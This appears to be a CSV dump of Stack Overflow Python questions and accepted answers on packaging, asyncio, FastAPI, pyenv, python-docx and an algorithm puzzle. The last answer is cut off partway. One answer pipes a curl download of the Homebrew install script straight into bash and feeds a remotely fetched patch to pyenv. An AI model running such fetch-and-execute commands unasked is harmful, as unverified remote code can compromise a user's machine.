"71386332","1","How do I specify ""extra"" / bracket dependencies in a pyproject.toml?","<p>I'm working on a project that specifies its dependencies using <a href=""https://python-poetry.org/docs/pyproject/"" rel=""noreferrer"">Poetry</a> and a <a href=""https://www.python.org/dev/peps/pep-0621/"" rel=""noreferrer"">pyproject.toml</a> file to manage dependencies. The documentation for one of the libraries I need <a href=""https://github.com/googleapis/python-bigquery/blob/main/README.rst"" rel=""noreferrer"">suggests</a> pip-installing with an &quot;extra&quot; option to one of the dependencies, like this:</p>
<pre><code>pip install google-cloud-bigquery[opentelemetry]
</code></pre>
<p>How should I reflect this requirement in the <code>pyproject.toml</code> file?  Currently, there are a few lines like this:</p>
<pre><code>[tool.poetry.dependencies]
python = &quot;3.7.10&quot;
apache-beam = &quot;2.31.0&quot;
dynaconf = &quot;3.1.4&quot;
google-cloud-bigquery = &quot;2.20.0&quot;
</code></pre>
<p>Changing the last line to</p>
<pre><code>google-cloud-bigquery[opentelemetry] = &quot;&gt;=2.20.0&quot;
</code></pre>
<p>yields</p>
<pre><code>Invalid TOML file /home/jupyter/vertex-monitoring/pyproject.toml: Unexpected character: 'o' at line 17 col 22
</code></pre>
<p>Other variants that don't seem to be parsed properly:</p>
<pre><code>google-cloud-bigquery[&quot;opentelemetry&quot;] = &quot;2.20.0&quot;
</code></pre>
<p>There are <a href=""https://stackoverflow.com/questions/46775346/what-do-square-brackets-mean-in-pip-install"">other</a> StackOverflow <a href=""https://stackoverflow.com/questions/69647590/can-i-specify-package-data-in-pyproject-toml"">questions</a> which look related, as well as <a href=""https://www.python.org/dev/peps/pep-0518/"" rel=""noreferrer"">several</a> <a href=""https://www.python.org/dev/peps/pep-0517/"" rel=""noreferrer"">different</a> <a href=""https://www.python.org/dev/peps/pep-0621/"" rel=""noreferrer"">PEP</a> <a href=""https://www.python.org/dev/peps/pep-0660/"" rel=""noreferrer"">docs</a>, but my searches are complicated because I'm not sure whether these are &quot;options&quot; or &quot;extras&quot; or something else.</p>
","71387157","<p>You can add it by <code>poetry add &quot;google-cloud-bigquery[opentelemetry]&quot;</code>. This will result in:</p>
<pre><code>[tool.poetry.dependencies]
...
google-cloud-bigquery = {extras = [&quot;opentelemetry&quot;], version = &quot;^2.34.2&quot;}
</code></pre>
"
"71938799","1","Python asyncio.create_task() - really need to keep a reference?","<p>The documentation of <code>asyncio.create_task()</code> states the following warning:</p>
<blockquote>
<p><strong>Important</strong>: Save a reference to the result of this function, to avoid a task disappearing mid execution. <a href=""https://docs.python.org/3.10/library/asyncio-task.html#asyncio.create_task"" rel=""noreferrer"">(source)</a></p>
</blockquote>
<p>My question is: Is this really true?</p>
<p>I have several IO bound &quot;fire and forget&quot; tasks which I want to run concurrently using <code>asyncio</code> by submitting them to the event loop using <code>asyncio.create_task()</code>. However, I do not really care for the return value of the coroutine or even if they run successfully, only that they <em>do</em> run eventually. One use case is writing data from an &quot;expensive&quot; calculation back to a Redis data base. If Redis is available, great. If not, oh well, no harm. This is why I do not want/need to <code>await</code> those tasks.</p>
<p>Here a generic example:</p>
<pre><code>import asyncio

async def fire_and_forget_coro():
    &quot;&quot;&quot;Some random coroutine waiting for IO to complete.&quot;&quot;&quot;
    print('in fire_and_forget_coro()')
    await asyncio.sleep(1.0)
    print('fire_and_forget_coro() done')


async def async_main():
    &quot;&quot;&quot;Main entry point of asyncio application.&quot;&quot;&quot;
    print('in async_main()')
    n = 3
    for _ in range(n):
        # create_task() does not block, returns immediately.
        # Note: We do NOT save a reference to the submitted task here!
        asyncio.create_task(fire_and_forget_coro(), name='fire_and_forget_coro')

    print('awaiting sleep in async_main()')
    await asycnio.sleep(2.0) # &lt;-- note this line
    print('sleeping done in async_main()')

    print('async_main() done.')

    # all references of tasks we *might* have go out of scope when returning from this coroutine!
    return

if __name__ == '__main__':
    asyncio.run(async_main())
</code></pre>
<p>Output:</p>
<pre><code>in async_main()
awaiting sleep in async_main()
in fire_and_forget_coro()
in fire_and_forget_coro()
in fire_and_forget_coro()
fire_and_forget_coro() done
fire_and_forget_coro() done
fire_and_forget_coro() done
sleeping done in async_main()
async_main() done.
</code></pre>
<p>When commenting out the <code>await asyncio.sleep()</code> line, we never see <code>fire_and_forget_coro()</code> finish. This is to be expected: When the event loop started with <code>asyncio.run()</code> closes, tasks will not be excecuted anymore. But it appears that as long as the event loop is still running, all tasks will be taken care of, even when I never explicitly created references to them. This seem logical to me, as the event loop itself <em>must</em> have a reference to all scheduled tasks in order to run them. And we can even get them all using <code>asyncio.all_tasks()</code>!</p>
<p>So, I <em>think</em> I can trust Python to have at least one strong reference to every scheduled tasks as long as the event loop it was submitted to is still running, and thus I do not have to manage references myself. But I would like a second opinion here. Am I right or are there pitfalls I have not yet recognized?</p>
<p>If I am right, why the explicit warning in the documentation? It is a usual Python thing that stuff is garbage-collected if you do not keep a reference to it. Are there situations where one does not have a running event loop but still some task objects to reference? Maybe when creating an event loop manually (never did this)?</p>
","71956673","<p>There is an open issue at the cpython bug tracker at github about this topic I just found:
<a href=""https://github.com/python/cpython/issues/88831"" rel=""noreferrer"">https://github.com/python/cpython/issues/88831</a></p>
<p>Quote:</p>
<blockquote>
<p>asyncio will only keep weak references to alive tasks (in <code>_all_tasks</code>). If a user does not keep a reference to a task and the task is not currently executing or sleeping, the user may get &quot;Task was destroyed but it is pending!&quot;.</p>
</blockquote>
<p>So the answer to my question is, unfortunately, yes. One has to keep around a reference to the scheduled task.</p>
<p>However, the github issue also describes a relatively simple workaround: Keep all running tasks in a <code>set()</code> and add a callback to the task which removes itself from the <code>set()</code> again.</p>
<pre><code>running_tasks = set()
# [...]
task = asyncio.create_task(some_background_function())
running_tasks.add(task)
task.add_done_callback(lambda t: running_tasks.remove(t))
</code></pre>
"
"71380024","1","Coverage.py Vs pytest-cov","<p>The documentation of <code>coverage.py</code> says that <code>Many people choose to use the pytest-cov plugin, but for most purposes, it is unnecessary.</code> So I would like to know what is the difference between these two? And which one is the most efficient ?</p>
<p>Thank you in advance</p>
","71388807","<p>pytest-cov uses coverage.py, so there's no different in efficiency, or basic behavior.  pytest-cov auto-configures multiprocessing settings, and ferries data around if you use pytest-xdist.</p>
"
"71268169","1","Optional query parameters in FastAPI","<p>I don't understand <a href=""https://fastapi.tiangolo.com/tutorial/query-params/#optional-parameters"" rel=""nofollow noreferrer"">optional query parameters</a> in FastAPI. How is it different from <a href=""https://fastapi.tiangolo.com/tutorial/query-params/#defaults"" rel=""nofollow noreferrer"">default query parameters</a> with a default value of <code>None</code>?</p>
<p>What is the difference between <code>arg1</code> and <code>arg2</code> in the example below where <code>arg2</code> is made an optional query parameter as described in the above link?</p>
<pre class=""lang-py prettyprint-override""><code>@app.get(&quot;/info/&quot;)
async def info(arg1: int = None, arg2: int | None = None):
    return {&quot;arg1&quot;: arg1, &quot;arg2&quot;: arg2}
</code></pre>
","71272615","<p>This <a href=""https://fastapi.tiangolo.com/it/tutorial/query-params-str-validations/"" rel=""noreferrer"">is covered in the reference manual</a>, albeit just as a small note:</p>
<pre><code>async def read_items(q: Optional[str] = None):
</code></pre>
<blockquote>
<p>FastAPI will know that the value of q is not required because of the default value = None.</p>
<p>The Optional in <code>Optional[str]</code> is not used by FastAPI, but will allow your editor to give you better support and detect errors.</p>
</blockquote>
<p>(<code>Optional[str]</code> is the same as <code>str | None</code> pre 3.10 for other readers)</p>
<p>Since your <em>editor</em> might not be aware of the context in which the parameter is populated and used by FastAPI, it might have trouble understanding the actual signature of the function when the parameter is not marked as <code>Optional</code>. You may or may not care about this distinction.</p>
"
"71862398","1","Install python 3.6.* on Mac M1","<p>I'm trying to run an old app that requires python &lt; 3.7. I'm currently using python 3.9 and need to use multiple versions of python.</p>
<p>I've installed <code>pyenv-virtualenv</code> and <code>pyenv</code> and successfully installed python 3.7.13. However, when I try to install 3.6.*, I get this:</p>
<pre><code>$ pyenv install 3.6.13
python-build: use openssl@1.1 from homebrew
python-build: use readline from homebrew
Downloading Python-3.6.13.tar.xz...
-&gt; https://www.python.org/ftp/python/3.6.13/Python-3.6.13.tar.xz
Installing Python-3.6.13...
python-build: use tcl-tk from homebrew
python-build: use readline from homebrew
python-build: use zlib from xcode sdk

BUILD FAILED (OS X 12.3.1 using python-build 2.2.5-11-gf0f2cdd1)

Inspect or clean up the working tree at /var/folders/r5/xz73mp557w30h289rr6trb800000gp/T/python-build.20220413143259.33773
Results logged to /var/folders/r5/xz73mp557w30h289rr6trb800000gp/T/python-build.20220413143259.33773.log

Last 10 log lines:
checking for --with-cxx-main=&lt;compiler&gt;... no
checking for clang++... no
configure:

  By default, distutils will build C++ extension modules with &quot;clang++&quot;.
  If this is not intended, then set CXX on the configure command line.
  
checking for the platform triplet based on compiler characteristics... darwin
configure: error: internal configure error for the platform triplet, please file a bug report
make: *** No targets specified and no makefile found.  Stop.
</code></pre>
<p>Is there a way to solve this? I've looked and it seems like Mac M1 doesn't allow installing 3.6.*</p>
","71957981","<p>Copying from a <a href=""https://github.com/pyenv/pyenv/issues/1768#issuecomment-1105450096"" rel=""noreferrer"">GitHub issue</a>.</p>
<hr />
<p>I successfully installed Python <code>3.6</code> on an Apple M1 MacBook Pro running Monterey using the following setup. There is probably some things in here that can be removed/refined... but it worked for me!</p>
<pre class=""lang-sh prettyprint-override""><code>#Install Rosetta
/usr/sbin/softwareupdate --install-rosetta --agree-to-license

# Install x86_64 brew
arch -x86_64 /bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)&quot;

# Set up x86_64 homebrew and pyenv and temporarily set aliases
alias brew86=&quot;arch -x86_64 /usr/local/bin/brew&quot;
alias pyenv86=&quot;arch -x86_64 pyenv&quot;

# Install required packages and flags for building this particular python version through emulation
brew86 install pyenv gcc libffi gettext
export CPPFLAGS=&quot;-I$(brew86 --prefix libffi)/include -I$(brew86 --prefix openssl)/include -I$(brew86 --prefix readline)/lib&quot;
export CFLAGS=&quot;-I$(brew86 --prefix openssl)/include -I$(brew86 --prefix bzip2)/include -I$(brew86 --prefix readline)/include -I$(xcrun --show-sdk-path)/usr/include -Wno-implicit-function-declaration&quot; 
export LDFLAGS=&quot;-L$(brew86 --prefix openssl)/lib -L$(brew86 --prefix readline)/lib -L$(brew86 --prefix zlib)/lib -L$(brew86 --prefix bzip2)/lib -L$(brew86 --prefix gettext)/lib -L$(brew86 --prefix libffi)/lib&quot;

# Providing an incorrect openssl version forces a proper openssl version to be downloaded and linked during the build
export PYTHON_BUILD_HOMEBREW_OPENSSL_FORMULA=openssl@1.0

# Install Python 3.6
pyenv86 install --patch 3.6.15 &lt;&lt;(curl -sSL https://raw.githubusercontent.com/pyenv/pyenv/master/plugins/python-build/share/python-build/patches/3.6.15/Python-3.6.15/0008-bpo-45405-Prevent-internal-configure-error-when-runn.patch\?full_index\=1)
</code></pre>
<p>Note, the build succeeds but gives the following warning</p>
<pre><code>WARNING: The Python readline extension was not compiled. Missing the GNU readline lib?
</code></pre>
<p>running <code>pyenv versions</code> shows that <code>3.6.15</code> can be used normally by the system</p>
"
"71410741","1","pip uninstall GDAL gives AttributeError: 'PathMetadata' object has no attribute 'isdir'","<p>I'm trying to <code>pip install geopandas</code> as a fresh installation, so I want to remove existing packages like <code>GDAL</code> and <code>fiona</code>. I've already managed to <code>pip uninstall fiona</code>, but when I try to uninstall or reinstall <code>GDAL</code> it gives the following error message:</p>
<pre><code>(base) C:\usr&gt;pip install C:/usr/Anaconda3/Lib/site-packages/GDAL-3.4.1-cp38-cp38-win_amd64.whl
Processing c:\usr\anaconda3\lib\site-packages\gdal-3.4.1-cp38-cp38-win_amd64.whl
Installing collected packages: GDAL
  Attempting uninstall: GDAL
    Found existing installation: GDAL 3.0.2
ERROR: Exception:
Traceback (most recent call last):
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_internal\cli\base_command.py&quot;, line 167, in exc_logging_wrapper
    status = run_func(*args)
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_internal\cli\req_command.py&quot;, line 205, in wrapper
    return func(self, options, args)
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_internal\commands\install.py&quot;, line 405, in run
    installed = install_given_reqs(
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_internal\req\__init__.py&quot;, line 68, in install_given_reqs
    uninstalled_pathset = requirement.uninstall(auto_confirm=True)
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_internal\req\req_install.py&quot;, line 637, in uninstall
    uninstalled_pathset = UninstallPathSet.from_dist(dist)
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_internal\req\req_uninstall.py&quot;, line 554, in from_dist
    for script in dist.iterdir(&quot;scripts&quot;):
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_internal\metadata\pkg_resources.py&quot;, line 156, in iterdir
    if not self._dist.isdir(name):
  File &quot;C:\usr\Anaconda3\lib\site-packages\pip\_vendor\pkg_resources\__init__.py&quot;, line 2816, in __getattr__
    return getattr(self._provider, attr)
AttributeError: 'PathMetadata' object has no attribute 'isdir'
</code></pre>
<p>Does anyone know why <code>GDAL</code> cannot be uninstalled?</p>
","71417752","<p>I just came across this question after getting the same error.  Coincidentally I had just upgraded pip (I was getting tired of the yellow warnings).</p>
<p>All I had was to down grade my pip</p>
<pre><code>pip install pip==21.3.1 --user
</code></pre>
"
"71391946","1","Does Raku has Python's Union type?","<p>In Python, Python has <a href=""https://docs.python.org/3/library/typing.html#typing.Union"" rel=""noreferrer"">Union</a> type, which is convenient when a method can accept multi types:</p>
<pre><code>from typing import Union

def test(x: Union[str,int,float,]):
    print(x)

if __name__ == '__main__':
    test(1)
    test('str')
    test(3.1415926)
</code></pre>
<p>Raku probably doesn't have Union type as Python, but a <code>where</code> clause can achieve a similar effect:</p>
<pre><code>sub test(\x where * ~~ Int | Str | Rat) {
    say(x)
}

sub MAIN() {
    test(1);
    test('str');
    test(3.1415926);
}
</code></pre>
<p>I wander if Raku have a possibility to provide the Union type as Python?</p>
<pre><code>#        vvvvvvvvvvvvvvvvvvvv - the Union type doesn't exist in Raku now.
sub test(Union[Int, Str, Rat] \x) {
    say(x)
}
</code></pre>
","71402432","<p>My answer (which is very similar to your first solution ;) would be:</p>
<pre><code>subset Union where Int | Rat | Str;

sub test(Union \x) {
   say(x) 
}

sub MAIN() {
    test(1);
    test('str');
    test(pi);
}

Constraint type check failed in binding to parameter 'x'; 
expected Union but got Num (3.141592653589793e0)
</code></pre>
<p>(or you can put a <code>where</code> clause in the call signature, as you have it)</p>
<p>In contrast to Python:</p>
<ul>
<li>this is native in raku and does not rely on a package like &quot;typing&quot; to be imported</li>
<li>Python Union / SumTypes are used for static hinting, which is good for eg. IDEs</li>
<li><strong>but</strong> these types are unenforced in Python (per @freshpaste comment and this <a href=""https://stackoverflow.com/questions/38854282/do-union-types-actually-exist-in-python"">SO</a>), in raku they are checked and will fail at runtime</li>
</ul>
<p>So - the raku syntax is there to do what you ask ... sure, it's a different language so it does it in a different way.</p>
<p>Personally I think that a typed language should fail if type checks are breached. It seems to me that type hinting that is not always enforced is a false comfort blanket.</p>
<p>On a wider point, raku also offers built in <a href=""https://docs.raku.org/type/Allomorph"" rel=""noreferrer"">Allomorph</a> types for IntStr, RatStr, NumStr and ComplexStr - so you can work in a mixed mode using both string and math functions</p>
"
"71470236","1","POST request response 422 error {'detail': [{'loc': ['body'], 'msg': 'value is not a valid dict', 'type': 'type_error.dict'}]}","<p>My <code>POST</code> request continues to fail with <code>422</code> response, even though valid <code>JSON</code> is being sent. I am trying to create a web app that receives an uploaded text file with various genetic markers and sends it to the tensorflow model to make a cancer survival prediction. The link to the github project can be found <a href=""https://github.com/Ryerson-BME-Capstone"" rel=""nofollow noreferrer"">here</a>.</p>
<p>Here is the <code>POST</code> request:</p>
<pre><code> df_json = dataframe.to_json(orient='records')
 prediction = requests.post('http://backend:8080/prediction/', json=json.loads(df_json), headers={&quot;Content-Type&quot;: &quot;application/json&quot;})
</code></pre>
<p>And here is the pydantic model along with the API endpoint:</p>
<pre><code>class Userdata(BaseModel):
RPPA_HSPA1A : float
RPPA_XIAP : float
RPPA_CASP7 : float
RPPA_ERBB3 :float
RPPA_SMAD1 : float
RPPA_SYK : float
RPPA_STAT5A : float
RPPA_CD20 : float
RPPA_AKT1_Akt :float
RPPA_BAD : float
RPPA_PARP1 : float
RPPA_MSH2 : float
RPPA_MSH6 : float
RPPA_ACACA : float
RPPA_COL6A1 : float
RPPA_PTCH1 : float
RPPA_AKT1 : float
RPPA_CDKN1B : float
RPPA_GATA3 : float
RPPA_MAPT : float
RPPA_TGM2 : float
RPPA_CCNE1 : float
RPPA_INPP4B : float
RPPA_ACACA_ACC1 : float
RPPA_RPS6 : float
RPPA_VASP : float
RPPA_CDH1 : float
RPPA_EIF4EBP1 : float
RPPA_CTNNB1 : float
RPPA_XBP1 : float
RPPA_EIF4EBP1_4E : float
RPPA_PCNA : float
RPPA_SRC : float
RPPA_TP53BP1 : float
RPPA_MAP2K1 : float
RPPA_RAF1 : float
RPPA_MET : float
RPPA_TP53 : float
RPPA_YAP1 : float
RPPA_MAPK8 : float
RPPA_CDKN1B_p27 : float
RPPA_FRAP1 : float
RPPA_RAD50 : float
RPPA_CCNE2 : float
RPPA_SNAI2 : float
RPPA_PRKCA_PKC : float
RPPA_PGR : float
RPPA_ASNS : float
RPPA_BID : float
RPPA_CHEK2 : float
RPPA_BCL2L1 : float
RPPA_RPS6 : float
RPPA_EGFR : float
RPPA_PIK3CA : float
RPPA_BCL2L11 : float
RPPA_GSK3A : float
RPPA_DVL3 : float
RPPA_CCND1 : float
RPPA_RAB11A : float
RPPA_SRC_Src_pY416 :float
RPPA_BCL2L111 : float
RPPA_ATM : float
RPPA_NOTCH1 : float
RPPA_C12ORF5 : float
RPPA_MAPK9 : float
RPPA_FN1 : float
RPPA_GSK3A_GSK3B : float
RPPA_CDKN1B_p27_pT198 : float
RPPA_MAP2K1_MEK1 : float
RPPA_CASP8 : float
RPPA_PAI : float
RPPA_CHEK1 : float
RPPA_STK11 : float
RPPA_AKT1S1 : float
RPPA_WWTR1 : float
RPPA_CDKN1A : float
RPPA_KDR : float
RPPA_CHEK2_2 : float
RPPA_EGFR_pY1173 : float
RPPA_EGFR_pY992 : float
RPPA_IGF1R : float
RPPA_YWHAE : float
RPPA_RPS6KA1 : float
RPPA_TSC2 : float
RPPA_CDC2 : float
RPPA_EEF2 : float
RPPA_NCOA3 : float
RPPA_FRAP1 : float
RPPA_AR : float
RPPA_GAB2 : float
RPPA_YBX1 : float
RPPA_ESR1 : float
RPPA_RAD51 : float
RPPA_SMAD4 : float
RPPA_CDH3 : float
RPPA_CDH2 : float
RPPA_FOXO3 : float
RPPA_ERBB2_HER : float
RPPA_BECN1 : float
RPPA_CASP9 : float
RPPA_SETD2 : float
RPPA_SRC_Src_mv : float
RPPA_GSK3A_alpha : float
RPPA_YAP1_pS127 : float
RPPA_PRKCA_alpha : float
RPPA_PRKAA1 : float
RPPA_RAF1_pS338 : float
RPPA_MYC : float
RPPA_PRKAA1_AMPK : float
RPPA_ERRFI1_MIG : float
RPPA_EIF4EBP1_2 : float
RPPA_STAT3 : float
RPPA_AKT1_AKT2_AKT3 : float
RPPA_NF2 : float
RPPA_PECAM1 : float
RPPA_BAK1 : float
RPPA_IRS1 : float
RPPA_PTK2 : float
RPPA_ERBB3_2 : float
RPPA_FOXO3_a : float
RPPA_RB1_Rb : float
RPPA_MAPK14_p38 : float
RPPA_NFKB1 : float
RPPA_CHEK1_Chk1 : float
RPPA_LCK : float
RPPA_XRCC5 : float
RPPA_PARK7 : float
RPPA_DIABLO : float
RPPA_CTNNA1 : float
RPPA_ESR1_ER : float
RPPA_IGFBP2 : float
RPPA_STMN1 : float
RPPA_WWTR1_TAZ : float
RPPA_CASP3 : float
RPPA_JUN : float
RPPA_CCNB1 : float
RPPA_CLDN7 : float
RPPA_PXN : float
RPPA_RPS6KB1_p : float
RPPA_KIT : float
RPPA_CAV1 : float
RPPA_PTEN : float
RPPA_BAX : float
RPPA_SMAD3 : float
RPPA_ERBB2 : float
RPPA_MET_c : float
RPPA_ERCC1 : float
RPPA_MAPK14 : float
RPPA_BIRC2 : float
RPPA_PIK3R1 : float
RPPA_BCL2 : float
RPPA_PEA : float
RPPA_EEF2K : float
RPPA_RPS6KB1_p70 : float
RPPA_MRE11A : float
RPPA_KRAS : float
RPPA_ARID1A : float
RPPA_YBX1_yb : float
RPPA_NOTCH3 : float
RPPA_EIF4EBP1_3 : float
RPPA_XRCC1 : float
RPPA_ANXA1 : float
RPPA_CD49 : float
RPPA_SHC1 : float
RPPA_PDK1 : float
RPPA_EIF4E : float
RPPA_MAPK1_MAPK3 : float
RPPA_PTGS2 : float
RPPA_PRKCA : float
RPPA_EGFR_egfr : float
RPPA_RAB25 : float
RPPA_RB1 : float
RPPA_MAPK1 : float
RPPA_TFF1 : float
    
class config:
    orm_mode = True
        
@app.post(&quot;/prediction/&quot;)
async def create_item(userdata: Userdata):
    df = pd.DataFrame(userdata)
    y = model.predict(df)
    y = [0 if val &lt; 0.5 else 1 for val in y]
    if y == 1:
        survival = 'You will survive.'
    if y == 0:
        survival = 'You will not survive.'
    return {'Prediction': survival}
</code></pre>
","71471293","<p>In Python <code>requests</code>, when sending <code>JSON</code> data using the <code>json</code> parameter, you need to pass a dict object (e.g., <code>json={&quot;RPPA_HSPA1A&quot;:30,&quot;RPPA_XIAP&quot;:-0.902044768}</code>), which <code>requests</code> will automatically encode into <code>JSON</code> and set the <code>Content-Type</code> header to <code>application/json</code>. In your case, however, as you are using  <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_json.html"" rel=""noreferrer""><code>to_json()</code></a> method, the object you get (i.e., <code>df_json</code> as you define it) is a <code>JSON</code> encoded string (you could verify that by printing out <code>type(df_json)</code>). Thus, you should rather use <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_dict.html"" rel=""noreferrer""><code>to_dict()</code></a> method, which returns a dictionary instead. Since you are using <code>orient='records'</code>, the returned object will be a <code>list</code> of <code>dict</code>, and thus, you need to get the first element from that <code>list</code>. Example below:</p>
<pre><code>data = dataframe.to_dict(orient='records')
payload = data[0]
prediction = requests.post('&lt;URL_HERE&gt;', json=payload)
</code></pre>
<p>Otherwise, if you used <code>to_json()</code> method, you would need to use the <code>data</code> parameter when posting the request (see the documentation <a href=""https://docs.python-requests.org/en/latest/user/quickstart/"" rel=""noreferrer"">here</a>), and as mentioned earlier, since you specify the orientation to <code>records</code> that returns a <code>list</code>, you would need to strip both the leading and trailing square brackets from that string. Also, using this method, you would need to manually set the <code>Content-Type</code> header to <code>application/json</code>. Example below:</p>
<pre><code>df_json = dataframe.to_json(orient='records')
payload = df_json.strip(&quot;[]&quot;)
prediction = requests.post('&lt;URL_HERE&gt;', data=payload, headers={&quot;Content-Type&quot;: &quot;application/json&quot;})
</code></pre>
"
"71150313","1","python-docx adding bold and non-bold strings to same cell in table","<p>I'm using python-docx to create a document with a table I want to populate from textual data. My text looks like this:</p>
<pre><code>01:02:10.3 
a: Lorem ipsum dolor sit amet,  
b: consectetur adipiscing elit.
a: Mauris a turpis erat. 
01:02:20.4 
a: Vivamus dignissim aliquam
b: Nam ultricies
(etc.)
</code></pre>
<p>I need to organize it in a table like this (using ASCII for visualization):</p>
<pre><code>+---+--------------------+---------------------------------+
|   |         A          |                B                |
+---+--------------------+---------------------------------+
| 1 | 01:02:10.3         | a: Lorem ipsum dolor sit amet,  |
| 2 |                    | b: consectetur adipiscing elit. |
| 3 |                    | a: Mauris a turpis erat.        |
| 4 | ------------------ | ------------------------------- |
| 5 | 01:02:20.4         | a: Vivamus dignissim aliqua     |
| 6 |                    | b: Nam ultricies                |
+---+--------------------+---------------------------------+
</code></pre>
<p>however, I need to make it so everything after &quot;a: &quot; is bold, and everything after &quot;b: &quot; isn't, while they <strong>both occupy the same cell</strong>. It's pretty easy to iterate and organize this the way I want, but I'm really unsure about how to make only some of the lines bold:</p>
<pre><code>IS_BOLD = { 
    'a': True
    'b': False
}

row_cells = table.add_row().cells

for line in lines: 
    if is_timestamp(line): # function that uses regex to discern between columns
        if row_cells[1]:
            row_cells = table.add_row().cells

        row_cells[0].text = line

    else 
        row_cells[1].text += line

        if IS_BOLD[ line.split(&quot;:&quot;)[0] ]:
            # make only this line within the cell bold, somehow.
</code></pre>
<p>(this is sort of pseudo-code, I'm doing some more textual processing but that's kinda irrelevant here). I found one <a href=""https://stackoverflow.com/questions/53638832/bold-underlining-and-iterations-with-python-docx"">probably relevant question</a> where someone uses something called <code>run</code> but I'm finding it hard to understand how to apply it to my case.</p>
<p>Any help?
Thanks.</p>
","71280321","<p>You need to add <code>run</code> in the cell's paragraph. This way you can control the specific text you wish to bold</p>
<p>Full example:</p>
<pre class=""lang-py prettyprint-override""><code>from docx import Document
from docx.shared import Inches
import os
import re


def is_timestamp(line):
    # it's flaky, I saw you have your own method and probably you did a better job parsing this.
    return re.match(r'^\d{2}:\d{2}:\d{2}', line) is not None


def parse_raw_script(raw_script):
    current_timestamp = ''
    current_content = ''
    for line in raw_script.splitlines():
        line = line.strip()
        if is_timestamp(line):
            if current_timestamp:
                yield {
                    'timestamp': current_timestamp,
                    'content': current_content
                }

            current_timestamp = line
            current_content = ''
            continue

        if current_content:
            current_content += '\n'

        current_content += line

    if current_timestamp:
        yield {
            'timestamp': current_timestamp,
            'content': current_content
        }


def should_bold(line):
    # i leave it to you to replace with your logic
    return line.startswith('a:')


def load_raw_script():
    # I placed here the example from your question. read from file instead I presume

    return '''01:02:10.3 
a: Lorem ipsum dolor sit amet,  
b: consectetur adipiscing elit.
a: Mauris a turpis erat. 
01:02:20.4 
a: Vivamus dignissim aliquam
b: Nam ultricies'''


def convert_raw_script_to_docx(raw_script, output_file_path):
    document = Document()
    table = document.add_table(rows=1, cols=3, style=&quot;Table Grid&quot;)

    # add header row
    header_row = table.rows[0]
    header_row.cells[0].text = ''
    header_row.cells[1].text = 'A'
    header_row.cells[2].text = 'B'

    # parse the raw script into something iterable
    script_rows = parse_raw_script(raw_script)

    # create a row for each timestamp row
    for script_row in script_rows:
        timestamp = script_row['timestamp']
        content = script_row['content']

        row = table.add_row()
        timestamp_cell = row.cells[1]
        timestamp_cell.text = timestamp

        content_cell = row.cells[2]
        content_paragraph = content_cell.paragraphs[0]  # using the cell's default paragraph here instead of creating one

        for line in content.splitlines():
            run = content_paragraph.add_run(line)
            if should_bold(line):
                run.bold = True

            run.add_break()

    # resize table columns (optional)
    for row in table.rows:
        row.cells[0].width = Inches(0.2)
        row.cells[1].width = Inches(1.9)
        row.cells[2].width = Inches(3.9)

    document.save(output_file_path)


def main():
    script_dir = os.path.dirname(__file__)
    dist_dir = os.path.join(script_dir, 'dist')

    if not os.path.isdir(dist_dir):
        os.makedirs(dist_dir)

    output_file_path = os.path.join(dist_dir, 'so-template.docx')
    raw_script = load_raw_script()
    convert_raw_script_to_docx(raw_script, output_file_path)


if __name__ == '__main__':
    main()

</code></pre>
<p>Result (file should be in <code>./dist/so-template.docx</code>):</p>
<p><a href=""https://i.stack.imgur.com/JOoHK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/JOoHK.png"" alt=""enter image description here"" /></a></p>
<hr />
<p>BTW - if you prefer sticking with your own example, this is what needs to be changed:</p>
<pre class=""lang-py prettyprint-override""><code>IS_BOLD = {
    'a': True,
    'b': False
}

row_cells = table.add_row().cells

for line in lines:
    if is_timestamp(line):
        if row_cells[1]:
            row_cells = table.add_row().cells
        row_cells[0].text = line

    else:
        run = row_cells[1].paragraphs[0].add_run(line)
        if IS_BOLD[line.split(&quot;:&quot;)[0]]:
            run.bold = True

        run.add_break()
</code></pre>
"
"71370656","1","Special Number Count","<p>It is a number whose gcd of (sum of quartic power of its digits, the product of its digits) is more than 1.
eg.
123 is a special number because hcf of(1+16+81, 6) is more than 1.</p>
<p>I have to find the count of all these numbers that are below input n.
eg.
for n=120 their are 57 special numbers between (1 and 120)</p>
<p>I have done a code but its very slow can you please tell me to do it in some good and fast way.
Is there is any way to do it using some maths.</p>
<pre><code>import math,numpy
t = int(input())

ans = []

for i in range(0,t):
    ans.append(0)
    n = int(input())
    for j in range(1, n+1):
        res = math.gcd(sum([pow(int(k),4) for k in str(j)]),numpy.prod([int(k) for k in str(j)]))
        if res&gt;1:
            ans[i] = ans[i] + 1

for i in range(0,t):
    print(ans[i])
</code></pre>
","71402821","<p>Here's an <code>O(log n)</code> algorithm for actually counting special numbers less than or equal to <code>n</code>. It builds digit strings one at a time, keeping track of whether 2, 3, 5 and 7 divide that digit string's product, and the remainder modulo 2, 3, 5, and 7 of the sum of fourth powers of those digits.</p>
<p>The logic for testing whether a number is special based on divisibility by those prime factors and remainder of powers under those factors is the same as in David's answer, and is explained better there. Since there are only <code>2^4</code> possibilities for which primes divide the product, and <code>2*3*5*7</code> possibilities for the remainder, there are a constant number of combinations of both that are possible, for a runtime of <code>O(2^4 * 210 * log n) = O(log n)</code>.</p>
<pre class=""lang-py prettyprint-override""><code>def count_special_less_equal(digits: List[int]) -&gt; int:
    &quot;&quot;&quot;Return the count of numbers less than or equal to the represented
    number, with the property that
    gcd(product(digits), sum(fourth powers of digits)) &gt; 1&quot;&quot;&quot;

    # Count all digit strings with zeroes
    total_non_special = len(digits)

    primes = (2, 3, 5, 7)
    prime_product = functools.reduce(operator.mul, primes, 1)

    digit_to_remainders = [pow(x, 4, prime_product) for x in range(10)]

    # Map each digit 1-9 to prime factors
    # 2: 2**0, 3: 2**1, 5: 2**2, 7: 2**3
    factor_masks = [0, 0, 1, 2, 1, 4, 3, 8, 1, 2]

    def is_fac_mask_mod_special(factor_mask: int,
                                remainder: int) -&gt; bool:
